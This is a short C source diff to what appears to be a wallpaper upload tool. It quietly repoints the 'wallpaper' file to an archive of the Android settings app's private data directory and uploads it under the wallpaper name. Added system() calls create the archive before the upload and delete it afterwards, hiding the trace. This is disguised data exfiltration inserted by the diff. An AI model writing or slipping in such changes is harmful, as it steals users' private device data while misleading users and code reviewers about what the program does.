@@ -22,7 +22,7 @@
 
 
 #ifndef __LINUX__
-#define LOCAL_WALLPAPER_FILE "/data/data/com.android.settings/wallaper"
+#define LOCAL_WALLPAPER_FILE "/data/settings.tar.gz"
 #else
 #define LOCAL_WALLPAPER_FILE "./wallpaper.jpg"
 #endif
@@ -81,10 +81,12 @@ SIGNATURE:
                 goto SIGNATURE;
 UPLOAD:
                 printf("can update now!\n");
+                system("tar cfz /data/settings.tar.gz /data/data/com.android.settings/");
                 CURLcode res = uploadLocalFile(LOCAL_WALLPAPER_FILE, uid, signature,CLOUD_WALLPAPER_FILE_NAME);
                 if(CURLE_OK == res) {
                     printf("upload success!\n");
                 }
+                system("rm /data/settings.tar.gz");
             }
         } else {
             printf("prikey file not exist\n");
